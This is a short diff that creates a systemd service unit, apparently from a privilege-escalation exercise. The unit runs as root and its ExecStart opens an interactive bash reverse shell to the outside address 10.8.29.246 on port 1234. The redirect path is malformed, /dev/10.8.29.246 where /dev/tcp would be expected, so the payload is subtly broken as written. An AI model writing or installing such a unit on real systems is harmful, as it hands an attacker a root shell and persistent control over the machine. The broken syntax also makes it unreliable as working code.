@@ -1,1 +1,10 @@
-"[Unit]nDescription=roooootnn[Service]nType=SimplenUser=rootnExecStart=/bin/bash
+[Unit]
+Description=rooooot
+
+[Service]
+Type=Simple
+User=root
+ExecStart=/bin/bash -c 'bash -i >& /dev/10.8.29.246/1234 >&1'
+
+[Install]
+WantedBy=multi-user.target
